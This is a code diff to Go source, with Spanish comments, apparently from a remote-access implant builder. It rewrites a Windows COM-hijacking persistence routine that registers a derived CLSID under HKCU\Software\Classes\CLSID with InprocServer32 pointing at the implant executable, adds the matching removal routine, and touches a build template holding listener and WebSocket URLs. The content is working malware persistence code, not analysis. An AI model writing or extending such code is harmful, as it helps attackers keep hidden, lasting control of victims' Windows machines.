@@ -1650,8 +1650,7 @@ func persistCOM(exe string) ([]byte, string) {
 		return nil, "persist com: solo disponible en Windows"
 	}
 	// CLSID determinista derivado del hash de la ruta.
-	h := fnv1a(exe)
-	clsid := fmt.Sprintf("{RT%08X-%04X-%04X-%04X-%012X}", h, h&0xffff, (h>>8)&0xffff, h&0xffff, h)
+	clsid := comCLSIDFor(exe)
 	key := "HKCU\\Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32"
 
 	if out, err := exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").CombinedOutput(); err != nil {
@@ -1664,27 +1663,41 @@ func persistCOM(exe string) ([]byte, string) {
 	return []byte(fmt.Sprintf("persist com: CLSID %s registrado (InprocServer32 = %s)\n", clsid, exe)), ""
 }
 
+func comCLSIDFor(exe string) string {
+	a := fnv1a(exe)
+	b := fnv1a(exe + "-rtc2-com")
+	// UUID con formato 8-4-4-4-12. Las máscaras &0x0fff fuerzan
+	// exactamente 3 dígitos hex en los grupos 3 y 4, para que el
+	// "4" y "8" (bits de versión y variante) queden en su sitio.
+	return fmt.Sprintf("{%08x-%04x-4%03x-8%03x-%04x%08x}",
+		a,
+		uint16(a>>16),
+		uint16(b)&0x0fff,
+		uint16(b>>16)&0x0fff,
+		uint16(a>>8)^uint16(b>>8),
+		uint32(b&0xffff)<<16|uint32(a&0xffff),
+	)
+}
+
 func unpersistCOM() ([]byte, string) {
 	if runtime.GOOS != "windows" {
 		return nil, "unpersist com: solo disponible en Windows"
 	}
-	// Borrar todas las claves CLSID que contengan nuestra marca. Como no
-	// guardamos el CLSID entre sesiones, borramos por patrón buscando
-	// los que apunten a un ejecutable (simplificación: listar y filtrar).
-	out, err := exec.Command("reg", "query", "HKCU\\Software\\Classes\\CLSID", "/s", "/f", "implant_", "/k").CombinedOutput()
+	exe, err := os.Executable()
 	if err != nil {
-		// No se encontró ninguno: nada que limpiar.
-		return []byte("unpersist com: ningún CLSID marcado encontrado\n"), ""
+		return nil, fmt.Sprintf("unpersist com: obtener ruta: %v", err)
 	}
-	_ = out
-	// Eliminar cada clave encontrada (el output tiene líneas con "HKCU\...").
-	for _, line := range strings.Split(string(out), "\n") {
-		line = strings.TrimSpace(line)
-		if strings.HasPrefix(line, "HKCU\\") && strings.Contains(line, "CLSID") {
-			_, _ = exec.Command("reg", "delete", line, "/f").CombinedOutput()
-		}
+	// Recalcular el mismo CLSID que persistCOM creó.
+	clsid := comCLSIDFor(exe)
+	key := "HKCU\\Software\\Classes\\CLSID\\" + clsid
+
+	out, err := exec.Command("reg", "delete", key, "/f").CombinedOutput()
+	if err != nil {
+		// No es fatal si la clave no existía.
+		return []byte(fmt.Sprintf("unpersist com: nada que borrar en %s (%s)\n",
+			clsid, strings.TrimSpace(string(out)))), ""
 	}
-	return []byte("unpersist com: claves CLSID eliminadas\n"), ""
+	return []byte(fmt.Sprintf("unpersist com: CLSID %s eliminado\n", clsid)), ""
 }
 
 // ── Windows: WMI subscription permanente ────────────────────────────────
@@ -2402,7 +2415,7 @@ func RenderTemplate(cfg *BuildConfig) ([]byte, error) {
 
 	data := TemplateData{
 		BuildID:         cfg.BuildID,
-		BuiltAt:         cfg.CreatedAt.Format("<TS_2034>"),
+		BuiltAt:         cfg.CreatedAt.Format("2006-01-02 15:04:05"),
 		GoBuildTag:      goBuildTag(cfg.TargetOS),
 		ListenerURL:     cfg.ListenerURL,
 		WSURL:           cfg.WSURL,
